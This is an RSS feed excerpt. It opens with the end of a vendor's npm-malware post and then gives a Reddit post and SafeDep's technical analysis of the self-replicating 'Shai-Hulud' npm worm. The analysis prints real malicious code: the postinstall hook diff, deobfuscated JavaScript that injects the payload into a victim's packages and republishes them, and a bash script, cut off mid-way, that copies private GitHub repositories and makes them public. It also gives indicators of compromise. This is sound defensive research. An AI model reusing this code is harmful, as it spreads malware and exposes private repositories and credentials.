versions</li></ul><p><strong>How to tell if you are affected using Aikido:</strong></p><p>If you are an Aikido user, check your central feed and filter on malware issues. The vulnerability will be surfaced as a 100/100 critical issue in the feed. <strong>Tip</strong>: Aikido rescans your repos nightly, though we recommend triggering a full rescan as well.</p><p>If you are not yet an Aikido user, <a href="https://app.aikido.dev/login?_gl=1*5vc6kw*_gcl_aw*R0NMLjE3NTE2MjY3NDMuQ2owS0NRanc5NTNEQmhDeUFSSXNBTmhJWm9iTlE1dF9QaXZmbjVGb0pGeGRDV0VYMU1sN3lzUzhCSURXeFhIb0tzV0lYM09Gc1ZuNTRtUWFBczZlRUFMd193Y0I.*_gcl_au*MTkyMTk3MTY1NS4xNzUyNDgyNzky*FPAU*MTE5NDkwODkyOS4xNzUyNDgyNzU0">set up an account</a> and connect your repos. Our proprietary malware coverage is included in the free plan (no credit card required).</p><p><strong>For future protection</strong>, considering using <a href="https://www.npmjs.com/package/@aikidosec/safe-chain">Aikido SafeChain&nbsp;(open source)</a>, a secure wrapper for npm, npx, yarn... Safechain sits in your current workflows, it works by intercepting npm, npx, yarn, pnpm and pnpx commands and verifying the packages for malware before install against <a href="https://intel.aikido.dev/?tab=malware"><strong>Aikido Intel - Open Sources Threat Intelligence.</strong></a> Stop threats before they hit your machine.</p><p>&zwj;</p><p>&zwj;</p></div><div><div><p>Charlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.</p></div></div></div><div><div><div><h2>AutoTriage Integration in IDE</h2><p>Aikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fix</p></div></div><div><div><h2>Aikido for Students and Educators</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div><div><div><h2>Free hands-on security labs for your students</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div></div><div><div><h2>Get secure for free</h2><p>Secure your code, cloud, and runtime in one central system.<br>Find and fix vulnerabilities <span>fast</span> automatically.</p><p>No credit card required |Scan results in 32secs.</p></div></div></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c938f5a9eb08d6b0b63db8_Dune_2021-Sandworm.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c93b06a4b5417495f6a444_3c0aef4a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c93b06a4b5417495f6a447_8e743ed6.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/67ea6658517bb9c783e617e2_65871099f04b9ebb3d253537_359431729_10161266676199604_6750652865330630761_n.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6836b17027f911d14ce42ba7_arrow%20right.svg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825fdbd77201ff82b42eaac_Frame%201321315277%20(1).avif"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825d8f68e45d9a5bf7a4beb_b1dbddf2b778530e6f5ace222c099514_random-cta-background.avif"></p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 19:09:03 +0530</pubDate></item><item><link>https://safedep.io/npm-supply-chain-attack-targeting-maintainers/</link><title>Self-replicating worm like behaviour in latest npm Supply Chain Attack (safedep.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/</guid><comments>https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 40 min | <a href='https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>We are investigating another npm supply chain attack. However, this one seems to be particularly interesting. Malicious payload include:</p><ul><li>Credential stealing using <code>trufflehog</code> scanning entire filesystem</li><li>Exposing GitHub private repositories</li><li>AWS credentials stealing</li></ul><p>Most surprisingly, we are observing self-replicating worm like behaviour if npm tokens are found from <code>.npmrc</code> and the affected user have packages published to npm.</p><p>Exposed GitHub repositories can be <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories&amp;s=updated&amp;o=desc">searched here</a>. Take immediate action if you are impacted.</p><p>Full technical details <a href="https://safedep.io/npm-supply-chain-attack-targeting-maintainers/">here</a>.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://safedep.io/images/npm-supply-chain-attack-ctrl-tinycolor-banner.png' /></section><section class='parsed-content'><div><h2>TL;DR</h2><p>npm supply chain attacks continue. This time targeting <code>@ctrl/tinycolor</code> and multiple other npm packages with credential stealer malware. In this blog, we will analyze the attack and its impact on the npm ecosystem. We will also look at common attack patterns that are being used to target maintainers.</p><p><strong>Update</strong>: Along with packages already mentioned, these new packages are discovered to be affected with same attack pattern.</p><p>Lately we have observed multiple high-profile software supply chain attacks against the npm ecosystem:</p><ul><li><a href="https://safedep.io/multiple-npm-packages-compromised-billion-downloads">ansi-styles, debug, chalk and more npm packages compromised</a></li><li><a href="https://safedep.io/nx-build-system-compromise/">nx Build System Compromised</a></li><li><a href="https://github.com/duckdb/duckdb-node/security/advisories/GHSA-w62p-hx95-gf2c">DuckDB npm packages compromised</a></li><li><a href="https://safedep.io/eslint-config-prettier-major-npm-supply-chain-hack/">eslint-config-prettier compromised</a></li></ul><p>These attacks target packages collectively with over <em>2 BILLION</em> weekly downloads. While the payloads used in these attacks have questionable sophistication levels, the continued success of malicious actors in breaching highly popular open source packages exposes risks in the open source software supply chain, especially for software development teams shipping professional software.</p><p>There are, however, common patterns that are observed in these attacks:</p><ol><li>2FA phishing attacks against maintainers as we saw in the <a href="https://safedep.io/eslint-config-prettier-major-npm-supply-chain-hack/">eslint-config-prettier incident</a></li><li>Maintainers of dormant packages are being targeted as we saw in the <a href="https://safedep.io/multiple-npm-packages-compromised-billion-downloads">ansi-style incident</a> and today&rsquo;s incident as well.</li></ol><p>For example, <code>@ctrl/tinycolor</code> did not have a release since over a year.</p><h3>Summary of Malicious Payload</h3><p><strong>Credential Harvesting:</strong></p><ul><li>Generates GitHub authentication tokens using <code>gh auth token</code> command</li><li>Harvests AWS credentials from environment variables, configuration files, Web Identity Tokens, and EC2 Instance Metadata Service (IMDS)</li><li>Uses TruffleHog to scan the local filesystem for secrets and credentials</li><li>Exfiltrates all discovered credentials to an attacker-controlled <code>webhook.site</code> URL</li></ul><p><strong>Repository Compromise:</strong></p><ul><li>Injects malicious GitHub Action workflows into all repositories accessible to the compromised user</li><li>Copies private repositories and makes them public with the description <code>Shai-Hulud Migration</code></li><li>Removes <code>.github/workflows</code> directories during the migration process to avoid detection</li></ul><p><strong>Self-Propagating Worm Behavior:</strong></p><ul><li>Extracts npm authentication tokens from <code>.npmrc</code> files</li><li>Identifies npm packages where the compromised user has maintainer access</li><li>Downloads package tarballs, injects the malicious <code>bundle.js</code> payload, and adds postinstall scripts</li><li>Automatically publishes new malicious versions of packages to npm registry</li><li>Increments package version numbers to ensure the malicious versions are treated as updates</li></ul><h3>How SafeDep can help?</h3><h4>Protect GitHub Repositories</h4><p>To protect the developer community against malicious packages that are flagged by SafeDep, we built free to use <a href="https://github.com/apps/safedep">SafeDep GitHub App</a>. It can be installed with zero configuration and will scan every pull request for malicious packages.</p><h4>Protect Developer Environments</h4><p>SafeDep open source tools especially <a href="https://github.com/safedep/vet">vet</a> and <a href="https://github.com/safedep/pmg">pmg</a> can help protect developers from malicious packages and other open source software supply chain attacks.</p><h2>The Attack</h2><p>The following is the list of affected package versions as published by <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">Socket Security</a>:</p><h2>Technical Analysis</h2><p>We will use <a href="https://www.npmjs.com/package/@ctrl/deluge">@ctrl/<span>[email&nbsp;protected]</span></a> as the malicious sample for our analysis. SafeDep&rsquo;s automated malicious package analysis engine flagged this version based on <a href="https://platform.safedep.io/community/malysis/01K57G6DA5GGCTGNEWT159SX6D">post-install script and signature match</a>.</p><p>We compared version <code>7.2.0</code> and <code>7.2.2</code> to identify the malicious changes. The obvious difference was the size of the package.</p><div><figure><pre><code><div><p><span>&#10095; du -sh *</span></p></div><div><p><span>12K deluge-7.2.0.tgz</span></p></div><div><p><span>2.0M deluge-7.2.2.tgz</span></p></div></code></pre></figure></div><p>Subsequently, we looked at <code>package.json</code> changes and observed a newly introduced <code>postinstall</code> script in the malicious version.</p><div><figure><pre><code><div><p><span>&#10095; diff -u package-7.2.0/package.json package-7.2.2/package.json</span></p></div><div><p><span>--- package-7.2.0/package.json 1985-10-26 13:45:00</span></p></div><div><p><span>+++ package-7.2.2/package.json 2025-09-16 01:43:28</span></p></div><div><p><span>@@ -1,6 +1,6 @@</span></p></div><div><p><span>{</span></p></div><div><p><span>"name": "@ctrl/deluge",</span></p></div><div><p><span>- "version": "7.2.0",</span></p></div><div><p><span>+ "version": "7.2.2",</span></p></div><div><p><span>"description": "TypeScript api wrapper for deluge using got",</span></p></div><div><div><p><span>"author": "Scott Cooper &lt;<a href="https://safedep.io/cdn-cgi/l/email-protection">[email&nbsp;protected]</a>&gt;",</span></p></div></div><div><p><span>"license": "MIT",</span></p></div><div><p><span>@@ -25,7 +25,8 @@</span></p></div><div><p><span>"build:docs": "typedoc",</span></p></div><div><p><span>"test": "vitest run",</span></p></div><div><p><span>"test:watch": "vitest",</span></p></div><div><p><span>- "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml"</span></p></div><div><p><span>+ "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml",</span></p></div><div><p><span>+ "postinstall": "node bundle.js"</span></p></div><div><p><span>},</span></p></div><div><p><span>"dependencies": {</span></p></div><div><p><span>"@ctrl/magnet-link": "^4.0.2",</span></p></div><div><p><span>@@ -83,4 +84,4 @@</span></p></div><div><p><span>"importOrderSeparation": true,</span></p></div><div><p><span>"importOrderSortSpecifiers": false</span></p></div><div><p><span>}</span></p></div><div><p><span>-}</span></p></div><div><p><span>+}</span></p></div></code></pre></figure></div><p>Looking at some of the strings in <code>bundle.js</code>, it appears to be packed with <a href="https://webpack.js.org/api/node/">webpack</a>.</p><div><figure><pre><code><div><p><span>/*! For license information please see bundle.js.LICENSE.txt */</span></p></div><div><p><span>import</span><span>{createRequire </span><span>as</span><span> __WEBPACK_EXTERNAL_createRequire}</span><span>from</span><span>"node:module"</span><span>;</span><span>var</span><span> __webpack_modules__</span><span>=</span><span>{</span><span>1</span><span>:(</span><span>t</span><span>,</span><span>r</span><span>,</span><span>n</span><span>)</span><span>=&gt;</span><span>{n.</span><span>r</span><span>(r),n.</span><span>d</span><span>(r,{</span><span>isRedirect</span><span>:()</span><span>=&gt;</span><span>isRedirect});</span><span>const</span><span>F</span><span>=new</span><span>Set</span><span>([</span><span>301</span><span>,</span><span>302</span><span>,</span><span>303</span><span>,</span><span>307</span></p></div><div><p><span>,</span><span>308</span><span>])</span></p></div></code></pre></figure></div><h3>Payload</h3><p>Observed malicious payload in <code>bundle.js</code>:</p><ul><li>Generates a GitHub auth token using <code>gh auth token</code> with the current user&rsquo;s credentials</li><li>Contains an embedded bash script that injects a malicious GitHub Action workflow into all repositories of the authenticated user</li><li>Contains an embedded bash script that copies private repositories using the compromised GitHub token and makes them public with the description <code>Shai-Hulud Migration</code></li><li>Uses <a href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> to mine secrets from the local filesystem and exfiltrate them to an attacker-controlled <code>webhook.site</code> URL</li><li>Harvests AWS credentials from environment variables, local configuration files, Web Identity Tokens, and the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html">IMDS</a> endpoint</li></ul><p><strong>Self-replicating worm like behavior</strong></p><p>The <code>bundle.js</code> payload has self-replicating worm-like behavior to infect <code>npm</code> packages that are accessible to the authenticated user. To achieve this, the payload does the following:</p><ul><li>Finds the infected user&rsquo;s npm token from the <code>.npmrc</code> file</li><li>Calls <code>https://registry.npmjs.org/-/whoami</code> to validate the token and retrieve the username</li><li>Searches for packages that are accessible to the authenticated user as a maintainer</li><li>Downloads the package tarball, injects the <code>bundle.js</code> payload, and adds a postinstall script to <code>package.json</code></li><li>Publishes the package to the authenticated user&rsquo;s npm registry using the <code>npm publish ...</code> command</li></ul><p>Example code:</p><div><figure><pre><code><div><p><span>async </span><span>searchPackages</span><span>(t, r </span><span>=</span><span>20</span><span>) {</span></p></div><div><p><span>const</span><span>n</span><span>=</span><span>`/-/v1/search?text=${</span><span>encodeURIComponent</span><span>(</span><span>t</span><span>)</span><span>}&amp;size=${</span><span>r</span><span>}`</span><span>,</span></p></div><div><p><span>F</span><span>=</span><span>`${</span><span>this</span><span>.</span><span>baseUrl</span><span>}${</span><span>n</span><span>}`</span><span>;</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span>await</span><span>fetch</span><span>(</span><span>F</span><span>, {</span></p></div><div><p><span>method: </span><span>"GET"</span><span>,</span></p></div><div><p><span>headers: </span><span>this</span><span>.</span><span>getHeaders</span><span>(</span><span>!</span><span>1</span><span>)</span></p></div><div><p><span>});</span></p></div><div><p><span>if</span><span> (</span><span>!</span><span>t.ok) </span><span>throw</span><span>new</span><span>Error</span><span>(</span><span>`HTTP ${</span><span>t</span><span>.</span><span>status</span><span>}: ${</span><span>t</span><span>.</span><span>statusText</span><span>}`</span><span>);</span></p></div><div><p><span>return</span><span> (</span><span>await</span><span> t.</span><span>json</span><span>()).objects </span><span>||</span><span> []</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>return</span><span> console.</span><span>error</span><span>(</span><span>"Error searching packages:"</span><span>, t), []</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div><p><strong>Update Package to inject bundle.js and modify package.json</strong></p><div><figure><pre><code><div><p><span>async </span><span>updatePackage</span><span>(t) {</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>const</span><span>ie</span><span>=</span><span>await</span><span>fetch</span><span>(t.tarballUrl, {</span></p></div><div><p><span>method: </span><span>"GET"</span><span>,</span></p></div><div><p><span>headers: {</span></p></div><div><p><span>"User-Agent"</span><span>: </span><span>this</span><span>.userAgent,</span></p></div><div><p><span>Accept: </span><span>"*/*"</span><span>,</span></p></div><div><p><span>"Accept-Encoding"</span><span>: </span><span>"gzip, deflate, br"</span></p></div><div><p><span>}</span></p></div><div><p><span>});</span></p></div><div><p><span>// [...]</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>await</span><span> re.promises.</span><span>writeFile</span><span>(ce, se), </span><span>await</span><span>te</span><span>(</span><span>`gzip -d -c ${</span><span>ce</span><span>} &gt; ${</span><span>le</span><span>}`</span><span>), </span><span>await</span><span>te</span><span>(</span><span>`tar -xf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/package.json`</span><span>);</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> ne.</span><span>join</span><span>(ae, </span><span>"package"</span><span>, </span><span>"package.json"</span><span>),</span></p></div><div><p><span>r</span><span>=</span><span>await</span><span> re.promises.</span><span>readFile</span><span>(t, </span><span>"utf-8"</span><span>),</span></p></div><div><p><span>n</span><span>=</span><span>JSON</span><span>.</span><span>parse</span><span>(r);</span></p></div><div><p><span>if</span><span> (n.version) {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> n.version.</span><span>split</span><span>(</span><span>"."</span><span>);</span></p></div><div><p><span>if</span><span> (</span><span>3</span><span>===</span><span> t.</span><span>length</span><span>) {</span></p></div><div><p><span>const</span><span>r</span><span>=</span><span>parseInt</span><span>(t[</span><span>]),</span></p></div><div><p><span>F</span><span>=</span><span>parseInt</span><span>(t[</span><span>1</span><span>]),</span></p></div><div><p><span>te</span><span>=</span><span>parseInt</span><span>(t[</span><span>2</span><span>]);</span></p></div><div><p><span>isNaN</span><span>(te) </span><span>||</span><span> (n.version </span><span>=</span><span>`${</span><span>r</span><span>}.${</span><span>F</span><span>}.${</span><span>te</span><span>+</span><span>1</span><span>}`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>n.scripts </span><span>||</span><span> (n.scripts </span><span>=</span><span> {}), n.scripts.postinstall </span><span>=</span><span>"node bundle.js"</span><span>, </span><span>await</span><span> re.promises.</span><span>writeFile</span><span>(t, </span><span>JSON</span><span>.</span><span>stringify</span><span>(n, </span><span>null</span><span>, </span><span>2</span><span>)), </span><span>await</span><span>te</span><span>(</span><span>`tar -uf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/package.json`</span><span>);</span></p></div><div><p><span>const</span><span>F</span><span>=</span><span> process.argv[</span><span>1</span><span>];</span></p></div><div><p><span>if</span><span> (</span><span>F</span><span>&amp;&amp;</span><span>await</span><span> re.promises.</span><span>access</span><span>(</span><span>F</span><span>).</span><span>then</span><span>(() </span><span>=&gt;</span><span>!</span><span>).</span><span>catch</span><span>(() </span><span>=&gt;</span><span>!</span><span>1</span><span>)) {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> ne.</span><span>join</span><span>(ae, </span><span>"package"</span><span>, </span><span>"bundle.js"</span><span>),</span></p></div><div><p><span>r</span><span>=</span><span>await</span><span> re.promises.</span><span>readFile</span><span>(</span><span>F</span><span>);</span></p></div><div><p><span>await</span><span> re.promises.</span><span>writeFile</span><span>(t, r), </span><span>await</span><span>te</span><span>(</span><span>`tar -uf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/bundle.js`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>await</span><span>te</span><span>(</span><span>`gzip -c ${</span><span>le</span><span>} &gt; ${</span><span>ue</span><span>}`</span><span>), </span><span>await</span><span>te</span><span>(</span><span>`npm publish ${</span><span>ue</span><span>}`</span><span>), </span><span>await</span><span> re.promises.</span><span>rm</span><span>(ae, {</span></p></div><div><p><span>recursive: </span><span>!</span><span>,</span></p></div><div><p><span>force: </span><span>!</span></p></div><div><p><span></span><span>})</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>// [...]</span></p></div><div><p><span>}</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>throw</span><span>new</span><span>Error</span><span>(</span><span>`Failed to update package: ${</span><span>t</span><span>}`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div><p><strong>Impact</strong></p><p>At the time of writing, at least 650+ repositories appear to be affected by this attack, as observed in a <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories">GitHub search</a>.</p><h2>Indicators of Compromise (IOC)</h2><ul><li><code>bundle.js</code> SHA2 <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li><li>GitHub repositories with description <code>Shai-Hulud Migration</code> <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories">example</a></li><li>HTTP requests to <code>hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code></li></ul><h2>Appendix</h2><p>Manually formatted shell script from <code>bundle.js</code> that exfiltrates private repositories using a compromised GitHub token and makes them public with the description <code>Shai-Hulud Migration</code>:</p><div><figure><pre><code><div><p><span>#!/bin/bash</span></p></div><div><p><span>#-----------------------------------------------------------------------</span></p></div><div><p><span># This script is designed to migrate all private and internal GitHub</span></p></div><div><p><span># repositories from a source organization to a target user's account.</span></p></div><div><p><span>#</span></p></div><div><p><span># It performs the following actions:</span></p></div><div><p><span># 1. Fetches all non-archived private and internal repositories from the SOURCE_ORG.</span></p></div><div><p><span># 2. For each repository, it creates a new private repository under the TARGET_USER.</span></p></div><div><p><span># 3. It then mirrors the original repository to the new one.</span></p></div><div><p><span># 4. Crucially, it removes the .github/workflows directory during migration.</span></p></div><div><p><span># 5. After a successful migration, it makes the new repository PUBLIC.</span></p></div><div><p><span>#</span></p></div><div><p><span># Usage:</span></p></div><div><p><span># ./migrate_script.sh <source_org> <target_user> <github_token></github_token></target_user></source_org></span></p></div><div><p><span>#</span></p></div><div><p><span># Arguments:</span></p></div><div><p><span># SOURCE_ORG: The name of the GitHub organization to migrate from.</span></p></div><div><p><span># TARGET_USER: The GitHub username to migrate the repositories to.</span></p></div><div><p><span># GITHUB_TOKEN: A personal access token with 'repo' scope.</span></p></div><div><p><span>#-----------------------------------------------------------------------</span></p></div><div><p><span>SOURCE_ORG</span><span>=</span><span>""</span></p></div><div><p><span>TARGET_USER</span><span>=</span><span>""</span></p></div><div><p><span>GITHUB_TOKEN</span><span>=</span><span>""</span></p></div><div><p><span>PER_PAGE</span><span>=</span><span>100</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>""</span></p></div><div><p><span># --- Argument Validation ---</span></p></div><div><p><span>if</span><span> [[ </span><span>$#</span><span>-lt</span><span>3</span><span> ]]; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Missing arguments."</span></p></div><div><p><span>echo</span><span>"Usage: </span><span>$0</span><span> <source_org> <target_user> <github_token>"</github_token></target_user></source_org></span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>SOURCE_ORG</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>TARGET_USER</span><span>=</span><span>"</span><span>$2</span><span>"</span></p></div><div><p><span>GITHUB_TOKEN</span><span>=</span><span>"</span><span>$3</span><span>"</span></p></div><div><p><span>if</span><span> [[ </span><span>-z</span><span>"</span><span>$SOURCE_ORG</span><span>"</span><span>||</span><span>-z</span><span>"</span><span>$TARGET_USER</span><span>"</span><span>||</span><span>-z</span><span>"</span><span>$GITHUB_TOKEN</span><span>"</span><span> ]]; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: All three arguments are required."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span># Create a temporary directory for cloning repositories</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>"./temp</span><span>$TARGET_USER</span><span>"</span></p></div><div><p><span>mkdir</span><span>-p</span><span>"</span><span>$TEMP_DIR</span><span>"</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>$(</span><span>realpath</span><span>"</span><span>$TEMP_DIR</span><span>"</span><span>)</span></p></div><div><p><span># --- Function to make authenticated GitHub API calls ---</span></p></div><div><p><span>github_api</span><span>() {</span></p></div><div><p><span>local</span><span> endpoint</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> method</span><span>=</span><span>"</span><span>${2</span><span>:-</span><span>GET</span><span>}</span><span>"</span></p></div><div><p><span>local</span><span> data</span><span>=</span><span>"</span><span>${3</span><span>:-</span><span>}</span><span>"</span></p></div><div><p><span>local</span><span> curl_args</span><span>=</span><span>(</span><span>"-s"</span><span>"-w"</span><span>"%{http_code}"</span><span>"-H"</span><span>"Authorization: token </span><span>$GITHUB_TOKEN</span><span>"</span><span>"-H"</span><span>"Accept: application/vnd.github.v3+json"</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$method</span><span>"</span><span>!=</span><span>"GET"</span><span> ]]; </span><span>then</span></p></div><div><p><span>curl_args</span><span>+=</span><span>(</span><span>"-X"</span><span>"</span><span>$method</span><span>"</span><span>)</span></p></div><div><p><span>fi</span></p></div><div><p><span>if</span><span> [[ </span><span>-n</span><span>"</span><span>$data</span><span>"</span><span> ]]; </span><span>then</span></p></div><div><p><span>curl_args</span><span>+=</span><span>(</span><span>"-H"</span><span>"Content-Type: application/json"</span><span>"-d"</span><span>"</span><span>$data</span><span>"</span><span>)</span></p></div><div><p><span>fi</span></p></div><div><p><span>curl</span><span>"${</span><span>curl_args</span><span>[</span><span>@</span><span>]}"</span><span>"https://api.github.com</span><span>$endpoint</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to retrieve all repositories from an organization ---</span></p></div><div><p><span>get_all_repos</span><span>() {</span></p></div><div><p><span>local</span><span> org</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> page</span><span>=</span><span>1</span></p></div><div><p><span>local</span><span> all_slugs</span><span>=</span><span>"[]"</span></p></div><div><p><span>while</span><span>true</span><span>; </span><span>do</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/orgs/</span><span>$org</span><span>/repos?type=private,internal&amp;per_page=</span><span>$PER_PAGE</span><span>&amp;page=</span><span>$page</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>!</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>empty</span><span>2&gt;</span><span>/dev/null</span><span>||</span><span>!</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'type == "array"'</span><span>&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> repos_count</span></p></div><div><p><span>repos_count</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>length</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$repos_count</span><span>"</span><span>-eq</span><span>0</span><span> ]]; </span><span>then</span></p></div><div><p><span>break</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> page_slugs</span></p></div><div><p><span>page_slugs</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>'[.[] | select(.archived == false) | .full_name]'</span><span>)</span></p></div><div><p><span>all_slugs</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$all_slugs</span><span>"</span><span>"</span><span>$page_slugs</span><span>"</span><span>|</span><span>jq</span><span>-s</span><span>'add'</span><span>)</span></p></div><div><p><span>((page</span><span>++</span><span>))</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"</span><span>$all_slugs</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to create a new repository for the target user ---</span></p></div><div><p><span>create_repo</span><span>() {</span></p></div><div><p><span>local</span><span> repo_name</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> repo_data</span></p></div><div><p><span>repo_data</span><span>=</span><span>$(</span><span>cat</span><span>&lt;&lt;</span><span>EOF</span></p></div><div><p><span>{</span></p></div><div><p><span>"name": "</span><span>$repo_name</span><span>",</span></p></div><div><p><span>"description": "Shai-Hulud Migration",</span></p></div><div><p><span>"private": true,</span></p></div><div><p><span>"has_issues": false,</span></p></div><div><p><span>"has_projects": false,</span></p></div><div><p><span>"has_wiki": false</span></p></div><div><p><span>}</span></p></div><div><p><span>EOF</span></p></div><div><p><span>)</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/user/repos"</span><span>"POST"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.name'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>else</span></p></div><div><p><span># Handle secondary rate limits by sleeping</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$http_code</span><span>"</span><span>=~</span><span> ^4[0-9][0-9]$ ]] &amp;&amp; </span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>grep</span><span>-qi</span><span>"secondary rate"</span><span>; </span><span>then</span></p></div><div><p><span>sleep</span><span>600</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/user/repos"</span><span>"POST"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.name'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>fi</span></p></div><div><p><span>fi</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to make a repository public ---</span></p></div><div><p><span>make_repo_public</span><span>() {</span></p></div><div><p><span>local</span><span> repo_name</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> repo_data</span></p></div><div><p><span>repo_data</span><span>=</span><span>$(</span><span>cat</span><span>&lt;&lt;</span><span>EOF</span></p></div><div><p><span>{</span></p></div><div><p><span>"private": 